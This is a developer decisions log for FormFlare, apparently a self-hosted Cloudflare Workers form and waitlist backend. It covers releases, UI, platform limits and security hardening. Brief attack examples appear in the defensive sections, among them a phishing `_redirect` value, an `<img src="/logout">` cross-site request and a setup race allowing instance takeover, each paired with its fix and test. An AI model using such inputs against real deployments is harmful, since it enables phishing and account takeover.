# Decisions

Deviations from `FORMFLARE_PLAN.md`, and the research behind them.
Format: date — what — why.

---

## Current state (2026-09-23)

**v0.2.1 is the current release.** MIT. Repo: https://github.com/SeifElkadyy/FormFlare
— annotated tag `v0.2.1` on `main`. Earlier: v0.2.0 at `f8c8823`, v0.1.0 at `d137ae8`.

Phases **0–6 are done**. That is the v1 product from the plan: Deploy to Cloudflare
button, `/setup` wizard, projects/forms, `POST /f/:publicId`, waitlists, spam layers,
Queues (email + webhooks), dashboard, REST API, and `scripts/check-update.mjs` for
cloned copies. R2 is optional so the button never asks for a payment card. Email
Sending is optional. Maintainer-only IDs live in `wrangler.dev.jsonc`, not
`wrangler.jsonc`.

**Open**: see **Next up**.

## Next up

- **README screenshot / demo GIF / live demo** — palette is in (Ink, Flare, Mist,
  Slate). Still waiting on a dedicated capture pass; do not shoot until the
  flame lockup and dashboard are the look we want to freeze.
- **Later from the plan** — Workers AI spam scoring; Telegram presets; n8n/Zapier
  templates; tags, notes and a lead pipeline; GDPR delete-by-email; TypeScript SDK and
  React component; team members and roles. (Per-form analytics shipped as Insights.)

---

## 2026-09-23 — Widget sizing, delivery alerts, Insights

**The widget was broken after submit, not just badly sized.** It iframed `/p/:slug` at a
fixed 420px, and the form inside posted to `/f/:id`, which 303s to `/thanks`. `/thanks`
carried `frame-ancestors 'none'` / `X-Frame-Options: DENY`, so every widget submission
ended on a refused frame. Now:

- `/thanks` gets the same framable headers as `/p/*`. It renders owner text and a
  number from the query string, and has nothing to clickjack.
- The hosted page posts to `/f/:id?embed=1` when framed. `handle.ts` carries `embed=1`
  onto the `/thanks` URL, which then renders without the page chrome.
- Both report their content height via `postMessage` (`src/components/frame-height.tsx`),
  and `widget.js` accepts it only from its own iframe's window and origin. Measures the
  content wrapper, not the document. The root layout's `min-h-full` body means
  `scrollHeight` can never be smaller than the iframe, so it would grow but never shrink.
- A form with a redirect URL submits with `target="_top"`: the owner's site almost
  certainly refuses to be framed.
- Public pages allow `form-action 'self' https:`. Chrome applies `form-action` to the
  redirect after a submit, so a hosted form redirecting to the owner's site was blocked.

Also: the hosted page never set `enctype="multipart/form-data"`, so file fields sent the
file *name* only. Set when the form has a file field.

**Failed deliveries surface on Home.** Failed webhook deliveries (active webhooks only)
and failed emails in the last 7 days rank first among the home insights. Nobody reads a
delivery log unprompted. The count includes the rare "marked as spam before delivery"
failure; not worth a status column to separate.

**Insights page (`/forms/:id/insights`).** Submissions per day (30 days, UTC, spam
excluded), hosted-page/widget views, conversion, top referrer hosts and countries. For
waitlists: confirmed/unconfirmed/referred counts and a top-50 leaderboard ordered by the
same score and tie-break as `waitlistRank` (a test checks they agree).

Views are a new `form_views (form_id, day, views)` table. Additive migration 0007, one
upsert per `/p` render via `waitUntil`. There are no cookies and no visitor ids.
Snippets on the owner's own site can't be counted, so the page says views cover the
hosted page and widget only. Bot views inflate it; acceptable for a trend line.

Not Workers Analytics Engine: it needs an API token to query, and FormFlare never
requires one.

**Second install in one account.** Can't be made unique in code (static names in
`wrangler.jsonc`). The Deploy page's D1 and Queue descriptions now say to rename them for
a second copy, and the login page links the fix. The login page is the only screen a
second install that shares a database ever shows.

**Docs:** `docs/custom-domain.md` covers `routes` in `wrangler.jsonc` versus the
dashboard, the instance URL, and turning off `workers.dev`. `docs/backups.md` covers D1
Time Travel (7 days on Free, 30 on Paid, always on) and exports.

---

## 2026-09-23 — One cron trigger per install

A real Deploy-button install failed at `wrangler deploy` with "reached the Workers Free
limit of 5 cron triggers per account". The limit is **per account**, not per Worker, and
every install registered two schedules (`*/15 * * * *` and `0 3 * * *`). Two installs
plus one other scheduled Worker used up the account.

Now one schedule, `*/15 * * * *`. Every run does the recovery sweep; the run whose
`scheduledTime` falls in 03:00–03:14 UTC also runs daily maintenance (`isDailySlot`).
Daily maintenance therefore runs after, not instead of, the 03:00 recovery sweep.

The same install also exposed the resource-name clash: with default names, a second
install in one account reuses the `formflare` database (silently) and the
`formflare-jobs` queue (which fails, since a queue has one consumer). Names in
`wrangler.jsonc` are static, so this cannot be made unique in code; it is documented in
troubleshooting instead. That run did **not** hit "Could not read package.json" — the
first build cloned real code — so the FAQ entry about it stays until it has been gone
for a few more installs.

---

## 2026-09-23 — Instance root, body cap, waitlist decoys

**`/` redirects to `/login`.** The root used to be a marketing hero with sample inbox
data and a "Create account" CTA. On a deployed instance that is the deployer's URL, so
it advertised FormFlare on their domain and pointed strangers at `/setup`. `/login`
already forwards to `/setup` (no owner) or `/home` (signed in). Marketing belongs on a
separate site.

**Multipart bodies are read through the capped stream before `formData()`.**
`request.formData()` buffers the whole body before the running size total runs, so a
chunked upload with no `Content-Length` could hold up to the plan's body limit
(100 MB on Free) in a 128 MB Worker. The body is now read with the same capped reader
as JSON and the bounded copy is parsed.

**Honeypot decoys match a real waitlist response.** The decoy lacked
`waitlist.position` / `referralCode` (and `pos` on the redirect), so a bot could tell
it was caught. It now returns the cached counter + 1 as its position, `pending` for
double-opt-in forms, and a throwaway referral code.

**Waitlist duplicates reveal membership — accepted.** A repeat signup returns the
person's current place, so posting an address tells you whether it is on the list.
Hiding it would mean giving repeat signups no place at all ("You're #214" is the
feature), and any difference between the two responses leaks the same bit. The per-IP
rate limit bounds probing. `api.md` also said "original" position; it is the current
rank (referrals move it). Fixed.

---

## 2026-09-18 — Brand palette

The dashboard was still Google-blue (`#0b57d0`) on a cool grey canvas (`#f4f6fb`).
The product palette is four tokens:

| Name | Hex | Role |
| --- | --- | --- |
| Ink | `#050505` | Primary text and UI |
| Flare | `#FF6A00` | Brand accent and highlights |
| Mist | `#F5F5F5` | Backgrounds and surfaces |
| Slate | `#9CA3AF` | Secondary text and borders |

Hex lives in `src/lib/brand.ts` and CSS variables in `src/app/globals.css`. White
cards stay on Mist so the inset shell still has depth. Flare fails WCAG with white
text, so primary buttons, the brand chip, and the waitlist badge count use Ink on
Flare. Dark mode is Ink canvas, Mist text, same Flare accent. Light-first and the
explicit `.dark` toggle are unchanged.

---

## 2026-09-18 — v0.2 feature set (one release)

Shipped together, not as separate tags: an instance that can take a waitlist signup
must also be able to email, confirm, show a public page, tell the owner a newer
release exists, and wipe itself. Splitting those across releases would leave deployers
on a half-working copy.

### Settings

There was no account settings page. `/settings` is now the workspace page: sender
address, mail provider, password, instance URL, update check, JSON export, and delete
account. The sidebar account card links here.

**Progressive disclosure (2026-09-18).** Owners with no mailer were landing on Resend,
From, API key, instance URL, password, updates, export and delete all at once, and
thought they had to connect Gmail. Settings now starts calm: Inbox is the inbox;
sending is optional and hidden behind “Turn on sending”. Password, instance URL and
delete stay inside `<details>`. Email CTAs go to `/settings#email`. A saved
`mailProvider=resend` without a working key still shows the off empty state, not the
setup form.

**Delete account** wipes the instance: R2 objects, every table, every settings row
including `session_secret` and `setup_completed`. `/setup` works again. It is not
"disable this user" — a single-owner install with setup locked and no users is a brick.
The owner types their email to confirm.

### Updates

Cloudflare strips `.github/` on clone, so deployers never get `update-check.yml`. The
dashboard banner and Settings → Check for updates fetch the latest *stable* GitHub
release (`SeifElkadyy/FormFlare`), cache the result in D1 for six hours, and ignore
pre-release tags the same way `scripts/check-update.mjs` does.

The banner is dismissed per-browser (`localStorage`), not instance-wide. A check that
fails (GitHub down, rate limit) keeps the last cache and does not block the dashboard.
No token, no deploy secret — public API, 60 unauthenticated requests/hour, hence the
cache.

### Email: Cloudflare or Resend

Still zero required secrets to deploy. The owner picks a provider in Settings:

| Provider | How |
| --- | --- |
| Cloudflare | existing `EMAIL` binding |
| Resend | API key pasted in Settings, encrypted at rest like Turnstile secrets |
| Off | neither; forms still work |

`Mailer` stays the interface. Resend is `fetch` to `https://api.resend.com/emails` —
no SDK, no paid npm dependency. Unset provider keeps the old behaviour: Cloudflare if
the binding exists, otherwise off.

Auto-reply abuse rules are unchanged (off by default, owner text only, one per address
per 24h). They apply whichever provider sends.

### Hosted form pages

`/p/:slug` renders the form's fields (via `effectiveFields()`, so it cannot drift from
the embed snippet). Slug is optional and unique; the public id always works. `?ref=`
is copied into a hidden `_ref` field for referrals.

Same-origin posts from `/p/…` are allowed even when the form has an origin allow-list,
otherwise a hosted page on this instance would 403 after the owner locked the form to
their marketing site.

`/p/*` is excluded from `frame-ancestors 'none'` / `X-Frame-Options: DENY` so the
embed widget (`/widget.js`) can iframe it onto someone else's site. The dashboard
keeps the clickjacking defence.

Public count: `GET /f/:publicId/count` (JSON) and `GET /f/:publicId/badge.svg`.
Waitlist counts confirmed signups only.

### Waitlist: double opt-in and referrals

`forms.double_opt_in` (default off). When on:

- The row is stored with no position and `opted_in_at` null.
- Fan-out sends only the confirmation email, then sets `fanned_out_at`.
- Confirm (`/confirm?s=&exp=&sig=`, HMAC of the submission id, 7-day expiry) assigns
  the position, credits the referrer, and fans out owner alerts / webhooks / auto-reply.
- Recovery treats `fanned_out_at < opted_in_at` as "confirm fan-out did not finish".
- Unconfirmed signups are excluded from the public count and from rank.

Existing rows are backfilled `opted_in_at = created_at` so they stay confirmed.
Default off means current waitlist tests and live forms are unchanged.

Referrals: each waitlist signup gets a `referral_code`. `_ref` is a reserved field.
`referral_boost` (default 0) is places subtracted per confirmed referral for **rank**,
not a rewrite of `waitlist_position` (rewriting would collide). Rank is computed at
read time: `position - referrals * boost`, ties broken by id. The original position
stays the signup order.

### Slack / Discord webhooks

`webhooks.preset` is `generic` (default), `slack`, or `discord`. Generic still sends
the signed JSON payload. Slack/Discord get an incoming-webhook body (`text` / `content`
+ embed) and skip HMAC — those receivers ignore our headers and reject unknown JSON.
URLs are still `https` + public host. The signing secret column stays NOT NULL (a
dummy is stored for presets) so this stays an additive column, not a nullability
change.

### What this is not

Not a version bump. Not the README screenshot. Not Telegram, n8n templates, AI spam
scoring, or teams.

---

## 2026-09-18 — Field editor, embed tabs, origin helper

A standard form stored `fields_json = []`. The snippet and hosted page then guessed
name/email/message, so owners could not add `company` or `phone` in the dashboard.
The public endpoint already kept extra fields; the UI did not. That was the biggest
gap after v0.2's waitlist/email work.

**Field editor** on form settings: name, type (including `tel`), required, reorder.
New forms seed `defaultFields()` instead of `[]`. Saving persists the list so the
snippet, preview, and hosted page cannot drift.

**Embed tabs** HTML / fetch JSON / React on the form page. The public `POST /f/:id`
still needs no API key. Keys stay for reading submissions.

**Allowed-origin helper:** input prefilled with the current page origin, **Add this
site**, and the note "Your CSS, our endpoint." Fetch from a browser sends that Origin.

**Double opt-in** cannot be turned on unless a mailer is available. An already-on
form keeps the flag if email later goes off; Inbox shows a copyable confirm URL so
unconfirmed signups are not a silent black hole.

**Split view (2026-09-18).** The form page is now editor left, hosted-page preview
right. Field, name and intro edits update the preview immediately. Send in the
preview is a real POST. Share (HTML / link / widget) sits in a closed row so the
left column can stay fields-first. `/forms/:id/preview` remains for a full-page
Turnstile check.

---

## 2026-09-18 — Dashboard home

Login and setup used to dump the owner in Inbox. An empty inbox is a dead end:
it does not say what to do next, and it hides “put this on your site”, email, and
fields.

`/home` is the dashboard landing. Banners are computed from the instance (no form,
no submissions, unconfirmed waitlist, email off, unused default fields) and capped
at two. Quick access, a four-step checklist, and recent forms/submissions sit
under that. Inbox stays Inbox.

---

## 2026-09-18 — `'unsafe-eval'` in CSP, development only

React 19 logs `eval() is not supported in this environment` under `next dev` unless
`script-src` includes `'unsafe-eval'`. It uses `eval()` to reconstruct server-side
error stacks in the browser; it never does this in production.

The production CSP is unchanged. `next.config.ts` adds `'unsafe-eval'` only when
`NODE_ENV === "development"`, so the OpenNext/workerd build still ships without it.

---

## 2026-09-17 — Light-first dashboard shell

The v0.1.0 UI was a top bar of links on a `prefers-color-scheme: dark` body. That made
dark mode the required look on any machine set to dark, and it did not read as a
dashboard.

**Default is light.** Dark is an explicit toggle stored in `localStorage`
(`formflare-theme=dark`). The OS preference is ignored — Tailwind's `dark:` variant is
rebound to `.dark` on `<html>`.

Color stays light-first (Mist canvas, Flare primary, Ink text). The shell is FormFlare's
own workspace: grouped sidebar (Collect / Connect), a solid **New form** button, an
inset rounded content panel, compact bordered search, and two-line submission rows.
It is **not** a Mailflare/Gmail clone.

The in-app update banner from Next up is **not** in this change.

---

## 2026-09-17 — UI polish values

Motion and surface recipes follow better-ui exact values: press `scale(0.96)` at 150ms,
`cubic-bezier(0.2, 0, 0, 1)`, shadow-as-border instead of decorative borders, concentric
radii on nested surfaces, theme-switch transition suppression, and hover lifts gated to
`(hover: hover) and (pointer: fine)`. Create/add flows stay in native `<dialog>`s, not
inline page forms.

Icons are `lucide-react` (stroke 1.75) except the brand flame. Appearance lives only in
the workspace header, not the account card.

---

## 2026-09-17 — Phase 0

### Verified against current docs (plan asked for confirmation)

**OpenNext supports Next.js 16 — existing scaffold kept.**
`@opennextjs/cloudflare@1.20.6` declares `next: ">=15.5.24 <16 || >=16.3.3"`. Next 16
support landed in 1.20.3. The scaffold's Next 16.3.5 satisfies this, and
`opennextjs-cloudflare build` + `preview` both succeed. No pin-back needed.
Known Next 16 caveats to carry into later phases: Node middleware is now `proxy.ts`
(experimental, needs `nodejs_compat`), and the instrumentation hook is stubbed by the
adapter because workerd cannot do dynamic requires.

**Rate limiting config — plan was correct.**
Top-level `"ratelimits"` key (not `unsafe.bindings`). `namespace_id` is a **string**
containing a positive integer. Runtime: `await env.X.limit({ key })` → `{ success }`.

**`send_email` has no `remote` field.** The plan flagged a `"remote": false` entry as an
open question. The documented schema is `name`, `destination_address`,
`allowed_destination_addresses` only. `remote` is omitted.

**PBKDF2 iteration cap is exactly 100,000 — and local dev hides it.**
Production workerd throws `NotSupportedError: Pbkdf2 failed: iteration counts above
100000 are not supported`. The cap exists because workerd's CPU limiter cannot
interrupt BoringSSL mid-derivation.

> ⚠️ **Trap for Phase 2:** Miniflare and Node happily run _higher_ counts, so an
> over-limit value passes every local test and then 500s in production. Hard-code
> 100,000 as a constant; do not "detect the maximum" at runtime.

This is below OWASP's 2023 guidance (600k for PBKDF2-SHA-256), a ceiling of the
platform, not a choice. Revisit if workerd raises the cap.

### Deviations

**`@cloudflare/vitest-pool-workers` → `@cloudflare/vitest-plugin`.**
The plan names the pool package. For Vitest 4 it was renamed and the API changed:
`defineWorkersConfig()` no longer exists, replaced by a `cloudflareTest()` plugin inside
a normal `defineConfig({ plugins: [...] })`. Now on `@cloudflare/vitest-plugin@1.1.11`
with `vitest@4.1.11` (the plugin requires `^4.1.0`; plain `vitest` installs v5, which is
unsupported — Vitest is pinned to avoid drifting into it).

**`vitest.config.mts`, not `.ts`.** The plugin is ESM-only and the project is not
`"type": "module"`, so a `.ts` config gets loaded via `require` and fails. The `.mts`
extension forces ESM loading.

**`compatibility_date` is 2026-09-16 — one date everywhere.**
Superseded an earlier Phase 0 approach that kept 2026-09-17 in `wrangler.jsonc` and
overrode the date only for local test/preview. Local and production must run identical
runtime settings: a divergence there means local tests exercise a different runtime than
production, which is the same class of bug as the PBKDF2 trap below.

The installed workerd (`1.20260916.1`) supports dates up to 2026-09-16, so that is the
real ceiling; 2026-09-17 was unusable locally (`ERR_FUTURE_COMPATIBILITY_DATE`). Both
overrides (`miniflare.compatibilityDate` in `vitest.config.mts`, and
`--compatibility-date` for preview) are removed. Bump the date in `wrangler.jsonc` only
when the installed workerd supports it, then rerun `npm run cf-typegen`.

**`@types/node` bumped `^20` → `^22`.** Vitest 4 requires `^22 || >=24`. Matches local
Node 22.

**`legacy-peer-deps=true` in a committed `.npmrc`.** npm 10.9.7 crashes with
`TypeError: Cannot read properties of null (reading 'edgesOut')` in arborist's
`#loadPeerSet` while resolving Vitest's optional-peer graph. This is an npm bug, not a
real conflict: every peer was verified satisfied after install
(vitest 4.1.11 vs plugin's `^4.1.0`, vite 8.3.0, @types/node 22.20.3).

The setting lives in `.npmrc` rather than a CI flag so that local, CI and **Cloudflare
Workers Builds** all install identically — Workers Builds runs its own `npm ci` and
would otherwise hit the crash during deploy. Caveat: the flag also suppresses genuine
peer conflicts, so verify resolved versions after adding a dependency.

**`cloudflare-env.d.ts` is committed, not generated at build time.** Cloudflare's build
runs `next build`, which type-checks, and never runs `cf-typegen` — an uncommitted file
would fail the deploy. CI regenerates it and runs `git diff --exit-code` to fail on
drift, so the committed copy cannot silently go stale after a `wrangler.jsonc` edit.

**Tests get their own tsconfig.** `tests/tsconfig.json` adds the plugin's types and
covers `vitest.config.mts`; the root config excludes `tests`. `npm run typecheck` runs
both. Tests import `env` from `cloudflare:workers` rather than the now-deprecated
`cloudflare:test` export.

**Prettier excludes `wrangler.jsonc`** (it adds trailing commas Wrangler's parser
rejects) **and the plan/agent Markdown files** (reformatting the source-of-truth
documents adds noise).

### Removed from the starter scaffold

It was stock `create-next-app` + Tailwind v4 — no auth, payments, analytics, DB client,
or env vars, so nothing threatened the zero-secrets principle. Deleted:
`public/{next,vercel,file,globe,window}.svg` and the boilerplate page body. Fixed
`globals.css`, where `body { font-family: Arial }` was overriding the Geist font
variable. `README.md` still needs replacing (Phase 6).

---

## 2026-09-17 — Phase 1

### Verified against current docs

**D1 `batch()` semantics, for waitlist positions.** The plan asked to confirm these.
Batched statements execute "sequentially, non-concurrently", and if one fails the whole
sequence is aborted or rolled back — but D1 "operates in auto-commit", so a batch is a
rollback boundary rather than a full isolation boundary.

What makes the plan's counter approach safe is a separate fact: **each D1 database is
backed by a single Durable Object**, so writes to one database are serialised and two
batches cannot interleave. `UPDATE forms SET submission_count = submission_count + 1`
followed by an insert reading that value is therefore safe against concurrent signups.
Phase 3 must still prove this with the 20-concurrent-signup test, and must not assume
the same holds across databases.

**Email Sending takes a structured message.** `env.EMAIL.send({ to, from, subject, html,
text })` is current; the raw-MIME `EmailMessage` from `cloudflare:email` is the legacy
path and is not needed.

### Decisions

**Waitlist dedupe is a partial unique index**, `ON submissions (form_id, email) WHERE
email IS NOT NULL`, in hand-written migration `0001_waitlist_dedupe.sql` (Drizzle cannot
express the `WHERE`). Partial rather than plain because standard forms legitimately store
many rows with a NULL email.

> ⚠️ SQLite's default collation is **case-sensitive**, so this index alone does not stop
> `A@Example.com` from duplicating `a@example.com`. Emails must be trimmed and lowercased
> before insert. **Superseded in Phase 2:** migration `0002` adds a `lower(email)`
> expression index so the database enforces this too; code-side normalisation stays.

**Foreign keys use `onDelete: "cascade"`** so deleting a form removes its submissions and
files, and deleting a submission removes its file rows. Covered by a test.

**Unique-violation assertions check `error.cause`, not the message.** Drizzle wraps D1
failures in a generic `Failed query: ...` Error and puts the real
`D1_ERROR: UNIQUE constraint failed: <table>.<column>` on `cause`. Matching the top-level
message would pass for _any_ failed query, so `tests/helpers.ts` asserts on the cause and
takes the expected column name.

**ID generation uses rejection sampling.** `byte % alphabet.length` would bias toward the
first `256 % length` characters and shrink the keyspace. Public form IDs are 10 chars over
a 56-char unambiguous alphabet (~58 bits) and are not derived from the internal ULID, so
forms cannot be enumerated. A uniformity test guards the sampling.

**Tests apply the real migrations** via `readD1Migrations()` (Node) injected as a
`TEST_MIGRATIONS` binding, then `applyD1Migrations()` in a setup file — so tests run
against production's schema, partial index included. Note: the type stub's docstring
points at `@cloudflare/vitest-plugin/config`, which does not exist; `readD1Migrations` is
on the package root.

---

## 2026-09-17 — Phase 2

### Case-insensitive waitlist dedupe (migration 0002)

`0001` indexes the raw email, which SQLite compares case-sensitively, so
`A@Example.com` could still duplicate `a@example.com`. `0002` adds
`UNIQUE (form_id, lower(email)) WHERE email IS NOT NULL` — SQLite supports expression
indexes directly, so no generated column or backfill was needed. Code-side
normalisation stays (it decides what is _stored_ and displayed); the index is the
backstop for a caller that forgets. `0001`'s index is kept: redundant for correctness,
but still serves exact-value lookups, and dropping a shipped index is not worth the risk.

Note: expression indexes report violations as
`UNIQUE constraint failed: index 'submissions_form_email_ci_uq'` rather than naming
columns, so `expectUniqueViolation` takes either form.

### Owner creation is one atomic statement

`INSERT INTO users SELECT … WHERE NOT EXISTS (SELECT 1 FROM users)`, then
`meta.changes === 1` decides the winner. Raw SQL because Drizzle cannot express
`INSERT … SELECT … WHERE NOT EXISTS`, and splitting it would reintroduce the race.

> Verified with a control test: the naive read-then-write version
> (`SELECT 1 FROM users` → `INSERT`) produced **20 owners from 20 parallel requests** —
> a complete instance takeover. The atomic version produces exactly 1.

### Optional `SETUP_TOKEN`

The gap between deploy and first setup is the one moment a stranger who finds the URL
could claim the instance. Requiring a secret would break the zero-secrets deploy promise
(principle 1), so the token is **opt-in**: unset (the default) → first-run lock only;
set → every setup request must present it, compared in constant time. It stays commented
in `.dev.vars.example`, so the deploy button never prompts for it, and is declared as an
optional field in `src/types/env.d.ts` (it is not in `wrangler.jsonc`, so `wrangler types`
does not generate it).

### Auth is not middleware

No `proxy.ts` / middleware auth. Edge middleware is skippable — a matcher typo, a route
added outside the pattern, or a rewrite bypasses it, and Next has shipped CVEs where
middleware auth could be skipped with a crafted header. Instead:

1. the `(dashboard)` server layout calls `requireUser()`, and
2. every server action and route handler calls `requireUserForMutation()`.

(2) is **not** redundant with (1): server actions are independently addressable POST
endpoints that do not re-run the layout, so a layout-only check leaves every action open.
Both dashboard pages and actions are `force-dynamic`, since a statically rendered shell
would be served from cache without checking the cookie.

`assertSameOrigin()` backs this with a CSRF origin check, because `SameSite=Lax` still
permits some top-level cross-site POST navigations and gives no protection on older
browsers. It compares Origin (falling back to Referer) against the live `Host`, so it
keeps working under any Worker name (principle 2).

### Login hardening

- **Account enumeration:** an unknown email is verified against a dummy hash so the
  response takes the same time as a wrong password, and both return the identical
  message. Disabled accounts fail the same way.
- **Timing:** password comparison is byte-wise constant time; `===` on the digests would
  leak how much of a guess matched.
- **Rotation:** a successful login deletes the user's other sessions, so a leaked token
  stops working once the owner signs in again.
- **At rest:** only `SHA-256(token)` is stored — a database leak yields no usable session.
  Verified in a test that the plaintext appears nowhere in the row.
- **Rate limit** keyed on IP _and_ email, so one attacker cannot lock out a victim from
  many IPs, nor spray many accounts from one IP.

### PBKDF2

`PBKDF2_ITERATIONS = 100_000`, with a test asserting the literal value _and_ a second
test proving the runtime accepts it. The constant test matters because Miniflare and Node
accept higher counts — a raised value would pass every other test and only fail in
production. The count is stored per-hash (`pbkdf2$<iterations>$…`) and verification reads
it from the record, so the cost can be raised later without invalidating existing
passwords.

### Rate limiting is approximate — a speed bump, not a guarantee

The Workers rate-limiting binding is **per-location and approximate**: counters are not
shared globally, so an attacker spread across regions can exceed the nominal limit, and
the count may lag under load. It genuinely stops naive brute force and floods from one
source, which is what `LOGIN_RATE_LIMIT` and `SUBMIT_RATE_LIMIT` are for.

Do not treat it as a quota or as the only defence. Anything needing a hard limit (billing
protection, strict abuse ceilings) needs Cloudflare WAF rules in front, or a Durable
Object counter. Documented for users in `docs/troubleshooting.md` and the README FAQ, so
nobody mistakes it for a strict cap.

### `session_secret` must never be rotated silently

Despite the name, it is not only a signing key. It is also:

- the source of the AES-GCM key that encrypts **Turnstile secrets and webhook signing
  secrets** at rest (Section 19), and
- the salt for submitter **IP hashes**.

Rotating it therefore makes every stored encrypted secret undecryptable and every
existing IP hash incomparable — silently, since decryption failures surface far from the
rotation. Any future "rotate key" feature must re-encrypt stored secrets under the new
key in the same transaction, and must be explicit that old IP hashes become orphaned.
The troubleshooting doc warns against deleting the row when resetting an instance.

### Password recovery is a CLI script

`npm run reset-password -- --email x --local|--remote`. There is no reset email: that
would require a configured mailer, and email is optional at runtime by design, so an
email-based flow would be unavailable exactly when an instance is least configured.

The script hashes in Node, outside the Worker, so it **duplicates** the derivation in
`src/lib/auth/password.ts`. If the two drift, a reset would write a hash the app cannot
verify and lock the owner out permanently with no other recovery path — so
`tests/reset-password.test.ts` reimplements the script's algorithm and asserts
`verifyPassword()` accepts its output, including the literal 100,000 iterations.

It deletes every session for the user in the same batch as the password update: a reset
after a suspected compromise must invalidate stolen cookies, not just change the
password. Verified end to end — reset, then signed in through the real login form.

### Found while testing

**Login form cleared the email field** after a failed attempt, forcing a full retype. The
action now echoes `email` back in its state. Found by driving the real form in a browser.

**The reset script silently did nothing with piped input.** Two `rl.question()` calls on
one readline: with piped stdin both lines arrive in a single chunk and the second
callback never fires, so the script exited with an empty password having changed nothing
— while looking like it had run. Now reads lines from the readline async iterator, and
`process.stdout.clearLine` is no longer called when stdout is not a TTY (it does not
exist there, and the first version crashed). Only surfaced by actually running the script
non-interactively.

### Logout is POST-only

`logoutAction` is a server action (POST) guarded by `assertSameOrigin()`, and no route
handler exists for `/logout`, so there is no GET path that can sign a user out — a
`<img src="/logout">` on another site cannot end a session.

Verified against a live session rather than assumed: with a valid cookie, `GET /logout`
returns 404, the session row survives, and the same cookie still authenticates `/inbox`
afterwards.

---

## 2026-09-17 — Phase 3

### Size limits are enforced twice

`Content-Length` is checked before a byte is read (cheap, rejects the common case), and a
running total is kept while parsing. The header alone is insufficient: it is
client-supplied and absent on chunked requests, so a malicious client can understate or
omit it. A test sends 600 KB of field data with an honest small body and still gets 413.

Text fields are capped separately (`MAX_FIELDS_BYTES`, 512 KB) from file bytes. Using one
combined budget meant a form with a generous 5 MB file allowance also licensed 5 MB of
text in a single field — caught by the test above, which initially returned 303.

**Cloudflare also caps request body size by plan** (100 MB on Free at the time of
writing, higher on paid). That is the outer bound; these per-form limits sit well below it.

### Turnstile secrets encrypted at rest

AES-GCM under a key derived from `session_secret` via **HKDF**, not the secret directly,
so the encryption key is domain-separated from the secret's other uses (IP hashing,
signing) — compromising one derived use does not yield the others. Format
`v1.<iv>.<ciphertext>`, with a fresh random IV per encryption (a reused IV under one key
leaks the key stream). `decryptSecret` returns null rather than throwing, so one bad row
degrades instead of 500ing the submission hot path.

> Test note: Cloudflare's `1x0000…` test secret **always passes**. The first version of
> the Turnstile test used it and silently asserted nothing. It now uses `2x0000…`, the
> always-fails secret, and makes a real call to the verifier.

### `_redirect` is restricted to allow-listed origins

`_redirect` arrives in the request body, so anyone can post `_redirect=https://phishing…`
to a public form. Honouring it unchecked makes every form an open redirect that lends the
instance's domain to a phishing flow.

It is therefore honoured **only** when it matches an origin the owner allow-listed. A form
with no allow-list cannot use it at all — there is nothing to check against, and allowing
anything is the hole being closed. A rejected `_redirect` falls back to the configured
redirect rather than erroring: the data is already saved, and where the browser lands is
not worth a 4xx. Verified live: the attempt redirected to `/thanks`, not the attacker's URL.

### Form cache: 30 seconds, per isolate

Config is cached per Worker isolate for 30s to keep a D1 read off the hot path. The cache
**cannot be cleared globally**, so deactivating or deleting a form takes up to 30 seconds
to apply everywhere. `invalidateForm()` clears the isolate that made the change, so the
dashboard is immediately consistent; others expire. Documented in the FAQ, the
troubleshooting guide and the form settings UI. Negative lookups are cached too, and the
map is bounded so unknown ids cannot grow it without limit.

### Honeypot and Turnstile failures create no jobs

Both return before `ctx.waitUntil`, so neither writes a row nor enqueues work. A honeypot
hit returns a **normal success** — telling a bot it was caught teaches the author to skip
the field. Tests count `waitUntil` calls rather than trusting the code path, and the live
run confirmed the bot submission is absent from the database.

### Waitlist positions

`UPDATE forms SET submission_count = submission_count + 1 … RETURNING submission_count` —
one statement, so the increment and the read cannot be separated by another request's
write. `UPDATE … RETURNING` was verified to work on D1 before relying on it.

**20 concurrent signups produce positions 1..20, unique and gap-free**, with the stored
rows and the form counter agreeing.

> ⚠️ Verified in **Miniflare**, whose scheduling is not identical to production's. Phase 6
> re-checks this against a real deployment. The reasoning behind it — one Durable Object
> per D1 database, so writes serialise — is what should hold in production.

Duplicates do not consume a position, so the list cannot develop gaps, and they enqueue no
job because the owner has already been told about that person. The handler also catches a
unique-violation from the dedupe index (two identical signups racing past the lookup) and
converts it into the duplicate response, rolling back any R2 objects that attempt uploaded.

### R2 cleanup on delete

Foreign keys cascade `files` rows, but a cascade runs inside SQLite and cannot reach R2 —
deleting only rows orphans every object, invisibly and billably. `deleteSubmission`,
`deleteSubmissions` and `deleteForm` therefore read the keys **before** removing the rows
(afterwards the key is unknowable) and delete the objects explicitly. `sweepOrphanedObjects`
in the daily cron catches anything stranded by a crash between the R2 put and the D1
insert, with a one-hour grace period so it cannot delete an upload that is still mid-request.

### Test note

The concurrency test initially failed with 429: 20 signups from one IP correctly hit
`SUBMIT_RATE_LIMIT` (10/60s, keyed `formId:ip`). Real signups come from many addresses, so
the test now uses distinct IPs. The rate limiter was behaving correctly.

---

## 2026-09-17 — Production verification (formflare-dev)

Deployed the Phase 3 state to a throwaway Worker on real Cloudflare infrastructure, to
check the things Miniflare cannot: production workerd, the real D1 Durable Object, and
the PBKDF2 cap.

**Instance:** a throwaway Worker on the maintainer's own account.
**Resources:** `formflare-dev` (D1), `formflare-dev-uploads` (R2),
`formflare-dev-jobs` (Queue). All `*-dev`-named, so a real install cannot collide.

### The `dev` environment

A `wrangler.jsonc` `env.dev` block, not `--name` flags, so the dev resources are declared
in version control and cannot accidentally point at production ones. The only behavioural
difference is `SUBMIT_RATE_LIMIT`: **same binding name** (so no code changes), namespace
`3001` instead of `2001`, and 1000/60s instead of 10/60s, so a burst of concurrent signups
is not throttled while testing the counter. Top-level production config is untouched —
`LOGIN_RATE_LIMIT` stays at 10/60s even in dev.

> `keep_vars` is not valid inside an `env` block; Wrangler rejects it. It stays top-level
> only. A first deploy that fails partway leaves an empty Worker shell that then fails
> with `[code: 10222] This Worker has no versions` — delete the Worker and redeploy.

### Results

| Check                                    | Result                                  |
| ---------------------------------------- | --------------------------------------- |
| Four system checks against real bindings | ✅ all green (D1, R2, Queue, Email)     |
| `/setup` creates the owner               | ✅ stored as `pbkdf2$100000$…`          |
| **PBKDF2 100,000 in production workerd** | ✅ **no `NotSupportedError`**           |
| Login after logout                       | ✅ verification works, not just hashing |
| `signup_enabled` default                 | ✅ `false`                              |
| `/setup` after completion                | ✅ 404                                  |
| `/inbox` unauthenticated                 | ✅ 307 → `/login`                       |
| `GET /logout`                            | ✅ 404, session survives                |
